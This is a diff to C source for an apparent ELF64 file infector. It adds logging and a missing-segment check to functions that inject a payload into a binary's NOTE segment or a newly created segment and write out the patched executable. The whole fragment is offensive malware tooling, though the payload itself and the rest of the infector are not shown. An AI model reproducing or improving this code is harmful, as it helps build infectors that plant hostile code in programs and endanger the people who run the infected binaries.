@@ -9,6 +9,7 @@
 #include "retcodes.h"
 #include "elf64_shr.h"
 #include "elf64_phr.h"
+#include "verbose.h"
 
 
 void infect(ELF *bin, unsigned char *payload, Elf64_Off offset, Elf64_Half pl_size, 
@@ -37,6 +38,7 @@ void infect(ELF *bin, unsigned char *payload, Elf64_Off offset, Elf64_Half pl_si
 
 // @req pnote->p_filesz >= *pl_size
 void Elf64_patch_existing_segment(ELF *bin, Elf64_Phdr *phr, unsigned char *pl, Elf64_Half *pl_size, FILE *target) {
+	std_out("[*] Patch binary by including payload in NOTE segment\n");
 	// TODO if no pnote (ie NULL)
 	pl = pad_payload(pl, pl_size, phr->p_filesz, 0x00);
 	// TODO if no pcode (ie NULL)
@@ -67,6 +69,7 @@ Elf64_Phdr *Elf64_create_phr(Elf64_Word p_flags, Elf64_Addr addr_base,
 
 void Elf64_patch_new_segment(ELF *bin, unsigned char *pl, Elf64_Half pl_size, 
 		FILE *target) {
+	std_out("[*] Patch binary by including payload in a new segment\n");
 	Elf64_Half i;
 	unsigned char byte;
 	Elf64_Phdr *pcode = Elf64_get_pcode(bin);
@@ -92,10 +95,16 @@ void Elf64_patch_binary(ELF *bin, unsigned char *pl, Elf64_Half *pl_size,
 	/* TODO check name */
 	FILE *target = fopen(out_fname, "w");
 	/* Check if payload fits in note section */	
+	std_out("[*] Look for NOTE segment for patch\n");
 	Elf64_Phdr *pnote = Elf64_get_pnote(bin);
-	if (pnote->p_filesz >= *pl_size)
-		Elf64_patch_existing_segment(bin, pnote, pl, pl_size, target);
-	else
+	if (pnote == NULL) {
+		std_out("[*] No NOTE segment found\n");
 		Elf64_patch_new_segment(bin, pl, *pl_size, target);
+	} else if (pnote->p_filesz >= *pl_size) {
+		Elf64_patch_existing_segment(bin, pnote, pl, pl_size, target);
+	} else {
+		std_out("[*] NOTE segment is to small to contain payload\n");
+		Elf64_patch_new_segment(bin, pl, *pl_size, target);
+	}
 	fclose(target);
 }
